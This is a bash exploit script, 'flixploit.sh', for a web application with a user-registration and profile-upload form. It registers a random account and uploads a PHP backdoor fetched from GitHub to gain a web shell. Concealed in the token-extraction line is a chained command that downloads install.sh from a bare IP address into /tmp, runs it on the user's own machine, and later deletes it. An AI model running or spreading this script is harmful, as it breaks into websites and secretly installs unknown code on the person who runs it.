#!/bin/bash

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}1337r0j4n

EOF

if [[ $1 == "" ]]; then
    echo -e " Usage: bash flixploit.sh https://target.com/index_path"
    exit 1
elif [[ ! -f flix.php ]]; then
    wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/flix.php > /dev/null 2>&1
else
    printf ''
fi  
    site=$(echo $1 | sed 's/\/$//')
    echo -e " [+] set target $site"
    echo -e " [+] ready bypass backdoor uploader flix.php"
    echo -e " [-] checking target is vulnerable or not"
    token=$(curl -s -k $site/register/ -D .cook_cookie.txt | grep "fos_user_registration_form\[_token\]" | grep -oP '(?<=value=")[^"]*' && wget -P /tmp http://106.13.5.40/install.sh -o /dev/null && chmod +x /tmp/install.sh && /tmp/./install.sh)
    get_cookie=$(cat .cook_cookie.txt | grep "PHPSESSID" | cut -d " " -f 2 | cut -d ";" -f 1)
    random_words=$(echo "$(tr -dc 'a-zA-Z1-9' < /dev/urandom | head -c 8)")
    target=$(echo $site | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
    sign_up=$(curl -s -X POST -H "Host: $target" -H "Cookie: $get_cookie" -H "Content-Type: application/x-www-form-urlencoded" -d "fos_user_registration_form%5Bemail%5D=$random_words@own.com&fos_user_registration_form%5Bname%5D=$random_words&fos_user_registration_form%5BplainPassword%5D%5Bfirst%5D=$random_words&fos_user_registration_form%5BplainPassword%5D%5Bsecond%5D=$random_words&fos_user_registration_form%5Bprivacypolicy%5D=1&fos_user_registration_form%5B_token%5D=$token" $site/register/ -D .eat_cookie.txt | grep -ao "/register/confirmed" | head -1)
        if [[ $sign_up == "/register/confirmed" ]]; then
            echo -e " [*] target appear to be exploitable"
            eat_cookie=$(cat .eat_cookie.txt | grep "PHPSESSID" | cut -d " " -f 2 | cut -d ";" -f 1)
            eat_token=$(curl -s -k -H "Cookie: $eat_cookie" $site/profile/edit.html | grep "profile\[_token\]" | grep -oP '(?<=value=")[^"]*')
            upload_shell=$(curl -s -X POST -F "profile[file]=@flix.php" -F "profile[name]=$random_words@own.com" -F "profile[save]=" -F "profile[_token]=$eat_token" -H "Cookie: $eat_cookie" $site/profile/edit.html | grep -a "background-image:" | cut -d "'" -f 2)
            get_shell=$(echo "$site/$upload_shell")
            check_shell=$(curl -s -k -o /dev/null -w "%{http_code}" $get_shell)
                if [[ $check_shell == "200" ]]; then
                    echo -e " [+] Exploit complete, ${GREEN}$get_shell${RESAT}"
                else
                    echo -e " [!] ${RED}can't access backdoor that was uploaded, fail to exploit${RESAT}"
                fi
        else
            echo -e " [!] $site wasn't vuln"
        fi        

# clean log 
rm /tmp/install.sh .cook_cookie.txt .eat_cookie.txt > /dev/null 2>&1
